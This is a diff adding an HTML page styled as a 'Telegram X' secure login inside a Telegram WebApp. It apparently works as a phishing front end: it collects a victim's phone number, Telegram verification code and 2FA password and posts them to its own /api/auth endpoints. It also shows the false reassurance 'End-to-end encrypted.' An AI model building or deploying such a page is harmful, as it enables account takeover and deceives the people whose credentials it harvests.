@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram X</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #0f0f1a;
+            color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: #1a1a2e;
+            border-radius: 24px;
+            padding: 32px 24px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
+        }
+        .header { text-align: center; margin-bottom: 32px; }
+        .logo { display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 8px; }
+        .logo h1 { font-size: 24px; font-weight: 600; color: #e0e0e0; }
+        .subtitle { color: #888; font-size: 14px; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-size: 14px; color: #aaa; margin-bottom: 6px; font-weight: 500; }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #2a2a3e;
+            border: 2px solid #333;
+            border-radius: 12px;
+            color: #e0e0e0;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        .form-group input:focus { border-color: #0088cc; }
+        .form-group input.error { border-color: #e53e3e; }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: #0088cc;
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .btn:hover { background: #0099dd; }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .btn .loader {
+            width: 20px;
+            height: 20px;
+            border: 3px solid #fff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .message {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 8px;
+            display: none;
+            font-size: 14px;
+        }
+        .message.success { display: block; background: rgba(76, 175, 80, 0.2); color: #4caf50; border: 1px solid #4caf50; }
+        .message.error { display: block; background: rgba(229, 62, 62, 0.2); color: #e53e3e; border: 1px solid #e53e3e; }
+        .footer { text-align: center; margin-top: 24px; color: #666; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
+                    <circle cx="20" cy="20" r="20" fill="#0088cc"/>
+                    <path d="M10 20.5L16 25L30 12" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+                <h1>Telegram X</h1>
+            </div>
+            <p class="subtitle">Secure Login</p>
+        </div>
+
+        <form id="authForm">
+            <div class="form-group">
+                <label for="phone">Phone Number</label>
+                <input type="tel" id="phone" placeholder="+7 (___) ___ - __ - __" autocomplete="tel" required>
+            </div>
+
+            <div id="codeSection" style="display:none;">
+                <div class="form-group">
+                    <label for="code">Verification Code</label>
+                    <input type="text" id="code" placeholder="Enter code from Telegram" autocomplete="one-time-code" required>
+                </div>
+                <div class="form-group" id="passwordSection" style="display:none;">
+                    <label for="password">2FA Password</label>
+                    <input type="password" id="password" placeholder="Enter 2FA password" autocomplete="current-password">
+                </div>
+            </div>
+
+            <button type="submit" id="submitBtn" class="btn">
+                <span id="btnText">Sign In</span>
+                <span id="btnLoader" class="loader" style="display:none;"></span>
+            </button>
+
+            <div id="message" class="message"></div>
+        </form>
+
+        <div class="footer">
+            <p>🔒 End-to-end encrypted</p>
+            <p class="hint">Enter your phone number to log in</p>
+        </div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        const form = document.getElementById('authForm');
+        const phoneInput = document.getElementById('phone');
+        const codeInput = document.getElementById('code');
+        const passwordInput = document.getElementById('password');
+        const codeSection = document.getElementById('codeSection');
+        const passwordSection = document.getElementById('passwordSection');
+        const submitBtn = document.getElementById('submitBtn');
+        const btnText = document.getElementById('btnText');
+        const btnLoader = document.getElementById('btnLoader');
+        const messageEl = document.getElementById('message');
+
+        let step = 'phone';
+        let currentPhone = '';
+
+        function showMessage(text, type) {
+            messageEl.textContent = text;
+            messageEl.className = 'message ' + type;
+            messageEl.style.display = 'block';
+        }
+
+        function hideMessage() {
+            messageEl.style.display = 'none';
+        }
+
+        function setLoading(loading) {
+            submitBtn.disabled = loading;
+            btnText.style.display = loading ? 'none' : 'inline';
+            btnLoader.style.display = loading ? 'inline-block' : 'none';
+        }
+
+        function formatPhone(value) {
+            const digits = value.replace(/\D/g, '');
+            if (digits.length === 0) return '';
+            let result = '+7';
+            if (digits.length > 1) {
+                result += ' (' + digits.substring(1, 4);
+            }
+            if (digits.length > 4) {
+                result += ') ' + digits.substring(4, 7);
+            }
+            if (digits.length > 7) {
+                result += ' - ' + digits.substring(7, 9);
+            }
+            if (digits.length > 9) {
+                result += ' - ' + digits.substring(9, 11);
+            }
+            return result;
+        }
+
+        phoneInput.addEventListener('input', function() {
+            const cursorPos = this.selectionStart;
+            const raw = this.value.replace(/\D/g, '');
+            const formatted = formatPhone(raw);
+            this.value = formatted;
+            const newPos = Math.min(cursorPos + (formatted.length - this.value.length + (this.value.length > formatted.length ? 0 : 1)), formatted.length);
+            this.setSelectionRange(newPos, newPos);
+        });
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            hideMessage();
+
+            if (step === 'phone') {
+                const phone = phoneInput.value.replace(/\D/g, '');
+                if (phone.length < 10) {
+                    showMessage('Please enter a valid phone number', 'error');
+                    return;
+                }
+                currentPhone = '+7' + phone.substring(1);
+                setLoading(true);
+
+                try {
+                    const resp = await fetch('/api/auth/send', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({phone: currentPhone})
+                    });
+                    const data = await resp.json();
+                    if (data.status === 'ok') {
+                        step = 'code';
+                        codeSection.style.display = 'block';
+                        showMessage('Code sent to your phone', 'success');
+                        codeInput.focus();
+                    } else {
+                        showMessage(data.message || 'Failed to send code', 'error');
+                    }
+                } catch (err) {
+                    showMessage('Connection error', 'error');
+                }
+                setLoading(false);
+                return;
+            }
+
+            if (step === 'code') {
+                const code = codeInput.value.trim();
+                if (!code || code.length < 5) {
+                    showMessage('Please enter the verification code', 'error');
+                    return;
+                }
+                setLoading(true);
+
+                try {
+                    const resp = await fetch('/api/auth/verify', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            phone: currentPhone,
+                            code: code,
+                            password: passwordInput.value.trim() || undefined
+                        })
+                    });
+                    const data = await resp.json();
+                    if (data.status === 'ok') {
+                        showMessage('✅ Access granted!', 'success');
+                        submitBtn.disabled = true;
+                        btnText.textContent = '✅ Logged in';
+                        tg.showAlert('Access granted!');
+                    } else if (data.message && data.message.includes('2FA')) {
+                        step = 'password';
+                        passwordSection.style.display = 'block';
+                        showMessage('Enter 2FA password', 'success');
+                        passwordInput.focus();
+                    } else {
+                        showMessage(data.message || 'Login failed', 'error');
+                    }
+                } catch (err) {
+                    showMessage('Connection error', 'error');
+                }
+                setLoading(false);
+                return;
+            }
+
+            if (step === 'password') {
+                const password = passwordInput.value.trim();
+                if (!password) {
+                    showMessage('Please enter 2FA password', 'error');
+                    return;
+                }
+                setLoading(true);
+
+                try {
+                    const resp = await fetch('/api/auth/verify', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            phone: currentPhone,
+                            code: codeInput.value.trim(),
+                            password: password
+                        })
+                    });
+                    const data = await resp.json();
+                    if (data.status === 'ok') {
+                        showMessage('✅ Access granted!', 'success');
+                        submitBtn.disabled = true;
+                        btnText.textContent = '✅ Logged in';
+                        tg.showAlert('Access granted!');
+                    } else {
+                        showMessage(data.message || 'Wrong password', 'error');
+                    }
+                } catch (err) {
+                    showMessage('Connection error', 'error');
+                }
+                setLoading(false);
+            }
+        });
+    </script>
+</body>
+              </html>
